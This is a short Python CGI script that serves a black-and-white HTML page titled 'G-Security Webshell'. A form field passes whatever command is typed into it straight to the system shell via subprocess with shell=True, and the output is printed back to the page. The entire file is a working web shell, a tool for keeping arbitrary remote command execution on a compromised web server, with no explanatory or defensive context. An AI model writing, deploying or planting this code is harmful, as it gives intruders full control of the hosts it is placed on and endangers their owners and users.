#!/usr/bin/env python3

import cgi
import subprocess

print("Content-type: text/html\n")

print("""
<html>
<head>
<title>G-Security Webshell</title>
</head>

<body bgcolor="#000000" text="#ffffff">
<form method="POST">
<br>
<input type="TEXT" name="-cmd" size="64" value="" style="background:#000000;color:#ffffff;">
<input type="submit" value="Execute">
<hr>
<pre>
""")

form = cgi.FieldStorage()
cmd = form.getvalue("-cmd", "")

if cmd:
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e.output}")

print("""
</pre>
</form>
</body>
</html>
""")
